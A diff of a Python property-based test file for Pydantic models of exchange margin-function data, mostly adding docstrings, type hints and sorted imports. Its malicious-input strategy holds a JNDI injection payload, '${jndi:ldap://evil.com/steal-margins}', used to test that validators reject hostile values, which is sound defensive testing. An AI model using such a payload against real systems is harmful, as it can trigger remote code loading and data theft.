@@ -11,23 +11,23 @@ SECURITY CRITICAL: These raw models protect against:
 - Type manipulation that could affect margin function behavior
 - Base/factor manipulation that could affect position sizing
 
-Property testing ensures comprehensive coverage of margin function edge cases and adversarial inputs.
+Property testing ensures comprehensive coverage of margin function edge cases and attacks.
 """
 
 from decimal import Decimal
 from typing import Any
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_margin_functions import (
     BackpackRawImfFunction,
+    BackpackRawMarginCoverage,
     BackpackRawMmfFunction,
     BackpackRawPositionImfFunction,
     BackpackRawPositionMmfFunction,
-    BackpackRawMarginCoverage,
 )
 from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
@@ -39,10 +39,14 @@ from cyberdelta.exceptions.parsing import EmptyStringError
 
 
 def margin_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for margin function base and factor fields."""
+    """Generate decimal strings for margin function base and factor fields.
+
+    Returns:
+        SearchStrategy[str]: Strategy generating valid decimal strings for margin values.
+    """
     return st.one_of([
         # Margin function values (typically small positive values)
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1"), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1), places=8).map(str),
         st.decimals(min_value=Decimal("0.001"), max_value=Decimal("0.1"), places=6).map(str),
         # Common margin values
         st.just("0.01"),  # 1% base
@@ -66,7 +70,11 @@ def margin_decimal_strategy() -> SearchStrategy[str]:
 
 
 def margin_type_strategy() -> SearchStrategy[str]:
-    """Generate valid margin function type strings."""
+    """Generate valid margin function type strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy generating valid margin function type strings.
+    """
     return st.one_of([
         # Common types
         st.just("sqrt"),  # Square root function
@@ -88,7 +96,11 @@ def margin_type_strategy() -> SearchStrategy[str]:
 
 
 def margin_coverage_strategy() -> SearchStrategy[str]:
-    """Generate valid margin coverage status strings."""
+    """Generate valid margin coverage status strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy generating valid margin coverage status strings.
+    """
     return st.sampled_from([
         "good",
         "bad",
@@ -102,8 +114,12 @@ def margin_coverage_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_imf_function_data(draw) -> dict[str, Any]:
-    """Generate valid IMF function data."""
+def valid_imf_function_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid IMF function data.
+
+    Returns:
+        dict[str, Any]: Valid IMF function data dictionary.
+    """
     return {
         "base": draw(margin_decimal_strategy()),
         "factor": draw(margin_decimal_strategy()),
@@ -111,8 +127,12 @@ def valid_imf_function_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_mmf_function_data(draw) -> dict[str, Any]:
-    """Generate valid MMF function data."""
+def valid_mmf_function_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid MMF function data.
+
+    Returns:
+        dict[str, Any]: Valid MMF function data dictionary.
+    """
     return {
         "base": draw(margin_decimal_strategy()),
         "factor": draw(margin_decimal_strategy()),
@@ -120,8 +140,12 @@ def valid_mmf_function_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_position_imf_function_data(draw) -> dict[str, Any]:
-    """Generate valid position IMF function data."""
+def valid_position_imf_function_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid position IMF function data.
+
+    Returns:
+        dict[str, Any]: Valid position IMF function data dictionary.
+    """
     return {
         "type": draw(margin_type_strategy()),
         "base": draw(margin_decimal_strategy()),
@@ -130,8 +154,12 @@ def valid_position_imf_function_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_position_mmf_function_data(draw) -> dict[str, Any]:
-    """Generate valid position MMF function data."""
+def valid_position_mmf_function_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid position MMF function data.
+
+    Returns:
+        dict[str, Any]: Valid position MMF function data dictionary.
+    """
     return {
         "type": draw(margin_type_strategy()),
         "base": draw(margin_decimal_strategy()),
@@ -140,16 +168,26 @@ def valid_position_mmf_function_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_margin_coverage_data(draw) -> dict[str, Any]:
-    """Generate valid margin coverage data."""
+def valid_margin_coverage_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid margin coverage data.
+
+    Returns:
+        dict[str, Any]: Valid margin coverage data dictionary.
+    """
     return {
         "type": "marginCoverage",
         "marginCoverage": draw(margin_coverage_strategy()),
     }
 
 
-def malicious_margin_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for margin security testing."""
+def malicious_margin_strategy() -> SearchStrategy[
+    str | int | float | bool | list[str] | dict[str, str] | bytes | None
+]:
+    """Generate malicious values for margin security testing.
+
+    Returns:
+        Strategy generating malicious values for security testing.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-margins}"),
@@ -200,7 +238,7 @@ class TestBackpackRawImfFunctionProperties:
 
     @given(imf_data=valid_imf_function_data())
     def test_imf_function_validation_success_properties(self, imf_data: dict[str, Any]) -> None:
-        """Property: Valid IMF function data should always create valid BackpackRawImfFunction objects."""
+        """Property: Valid IMF function data should always create valid objects."""
         # Skip invalid decimal values
         try:
             for field in ["base", "factor"]:
@@ -232,10 +270,12 @@ class TestBackpackRawImfFunctionProperties:
         field_name=st.sampled_from(["base", "factor"]), malicious_value=malicious_margin_strategy()
     )
     def test_imf_function_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: str | float | bool | list[str] | dict[str, str] | bytes | None,
     ) -> None:
         """Property: IMF function model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "base": "0.01",
             "factor": "0.005",
         }
@@ -353,7 +393,7 @@ class TestBackpackRawMmfFunctionProperties:
 
     @given(mmf_data=valid_mmf_function_data())
     def test_mmf_function_validation_success_properties(self, mmf_data: dict[str, Any]) -> None:
-        """Property: Valid MMF function data should always create valid BackpackRawMmfFunction objects."""
+        """Property: Valid MMF function data should always create valid objects."""
         # Skip invalid decimal values
         try:
             for field in ["base", "factor"]:
@@ -385,10 +425,12 @@ class TestBackpackRawMmfFunctionProperties:
         field_name=st.sampled_from(["base", "factor"]), malicious_value=malicious_margin_strategy()
     )
     def test_mmf_function_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: str | float | bool | list[str] | dict[str, str] | bytes | None,
     ) -> None:
         """Property: MMF function model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "base": "0.02",
             "factor": "0.008",
         }
@@ -432,7 +474,7 @@ class TestBackpackRawPositionImfFunctionProperties:
     def test_position_imf_function_validation_success_properties(
         self, position_imf_data: dict[str, Any]
     ) -> None:
-        """Property: Valid position IMF function data should always create valid BackpackRawPositionImfFunction objects."""
+        """Property: Valid position IMF function data should always create valid objects."""
         # Skip invalid decimal values
         try:
             for field in ["base", "factor"]:
@@ -467,10 +509,12 @@ class TestBackpackRawPositionImfFunctionProperties:
         malicious_value=malicious_margin_strategy(),
     )
     def test_position_imf_function_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: str | float | bool | list[str] | dict[str, str] | bytes | None,
     ) -> None:
         """Property: Position IMF function model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "sqrt",
             "base": "0.01",
             "factor": "0.005",
@@ -520,7 +564,7 @@ class TestBackpackRawPositionMmfFunctionProperties:
     def test_position_mmf_function_validation_success_properties(
         self, position_mmf_data: dict[str, Any]
     ) -> None:
-        """Property: Valid position MMF function data should always create valid BackpackRawPositionMmfFunction objects."""
+        """Property: Valid position MMF function data should always create valid objects."""
         # Skip invalid decimal values
         try:
             for field in ["base", "factor"]:
@@ -555,10 +599,12 @@ class TestBackpackRawPositionMmfFunctionProperties:
         malicious_value=malicious_margin_strategy(),
     )
     def test_position_mmf_function_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: str | float | bool | list[str] | dict[str, str] | bytes | None,
     ) -> None:
         """Property: Position MMF function model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "sqrt",
             "base": "0.02",
             "factor": "0.008",
@@ -608,7 +654,7 @@ class TestBackpackRawMarginCoverageProperties:
     def test_margin_coverage_validation_success_properties(
         self, coverage_data: dict[str, Any]
     ) -> None:
-        """Property: Valid margin coverage data should always create valid BackpackRawMarginCoverage objects."""
+        """Property: Valid margin coverage data should always create valid objects."""
         # Skip empty strings
         for field in ["type", "marginCoverage"]:
             value = coverage_data[field]
@@ -634,10 +680,12 @@ class TestBackpackRawMarginCoverageProperties:
         malicious_value=malicious_margin_strategy(),
     )
     def test_margin_coverage_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self,
+        field_name: str,
+        malicious_value: str | float | bool | list[str] | dict[str, str] | bytes | None,
     ) -> None:
         """Property: Margin coverage model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, object] = {
             "type": "marginCoverage",
             "marginCoverage": "good",
         }
